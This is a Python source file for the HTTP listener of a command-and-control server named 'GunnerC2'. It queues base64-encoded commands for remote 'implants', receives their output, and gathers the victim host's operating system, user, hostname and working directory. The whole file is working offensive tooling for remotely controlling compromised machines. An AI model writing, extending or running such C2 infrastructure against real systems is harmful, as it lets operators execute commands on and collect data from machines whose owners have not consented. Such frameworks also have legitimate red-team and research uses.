import json
import base64
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading
from core import session_manager, utils
import random
import string
import os,sys,subprocess
from core.session_manager import kill_http_session

from colorama import init, Fore, Style
brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred = "\001" + Style.BRIGHT + Fore.RED + "\002"
brightblue = "\001" + Style.BRIGHT + Fore.BLUE + "\002"

PROMPT = brightblue + "GunnerC2 > "


class C2HTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        sid = self.headers.get("X-Session-ID")

        if sid and sid in session_manager.dead_sessions:
            # 410 Gone tells the implant “never come back”
            self.send_response(410, "Gone")
            self.end_headers()
            return

        if not sid:
            sid = generate_http_session_id()
            session_manager.register_http_session(sid)
            print(brightgreen + f"\n[+] New HTTP agent: {sid}")
        else:
            if sid not in session_manager.sessions:
                session_manager.register_http_session(sid)
                print(brightgreen + f"\n[+] New HTTP agent: {sid}")

        if not sid:
            self.send_response(400)
            self.end_headers()
            return

        if sid not in session_manager.sessions:
            session_manager.register_http_session(sid)
            print(brightgreen + f"\n[+] New HTTP agent: {sid}")

        session = session_manager.sessions[sid]
        try:
            cmd_b64 = session.command_queue.get_nowait()
        except:
            cmd_b64 = ""

        payload = json.dumps({"cmd": cmd_b64}).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(payload)))
        self.end_headers()
        self.wfile.write(payload)

    def do_POST(self):
        sid = self.headers.get("X-Session-ID")
        if not sid:
            self.send_response(400)
            self.end_headers()
            return

        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length)
        try:
            msg = json.loads(body)
            output_b64 = msg.get("output", "")
            output = base64.b64decode(output_b64).decode("utf-8", "ignore").strip()
            session = session_manager.sessions[sid]


            cwd = msg.get("cwd")
            user = msg.get("user")
            host = msg.get("host")

            if cwd: session.metadata["cwd"] = cwd
            if user: session.metadata["user"] = user
            if host: session.metadata["hostname"] = host

            # Handle OS detection first
            if session.mode == "detect_os":
                #print(f"[DEBUG] HTTP agent {sid} OS check: {output}")
                session.detect_os(output)

                # Queue OS-specific metadata commands
                for _, cmd in session.os_metadata_commands:
                    session.command_queue.put(base64.b64encode(cmd.encode()).decode())

                session.mode = "metadata"
                session.metadata_stage = 0
                self.send_response(200)
                self.send_header("Content-Length", "0")
                self.end_headers()
                return

            # Handle metadata collection
            if session.metadata_stage < len(session.metadata_fields):
                field = session.metadata_fields[session.metadata_stage]
                session.metadata[field] = output
                session.metadata_stage += 1

            else:
                session.output_queue.put(output_b64)

            self.send_response(200)
            self.send_header("Content-Length", "0")
            self.end_headers()
        except:
            self.send_response(400)
            self.end_headers()

    def log_message(self, *args):
        return

def start_http_listener(ip, port):
    print(brightyellow + f"[+] HTTP listener started on {ip}:{port}\n")
    #sys.stdout.write(PROMPT)
    #sys.stdout.flush()
    httpd = HTTPServer((ip, port), C2HTTPRequestHandler)
    utils.http_listener_sockets[f"http-{ip}:{port}"] = httpd
    httpd.serve_forever()

def generate_http_session_id():
    parts = []
    for _ in range(3):
        parts.append(''.join(random.choices(string.ascii_lowercase + string.digits, k=5)))
    return '-'.join(parts)
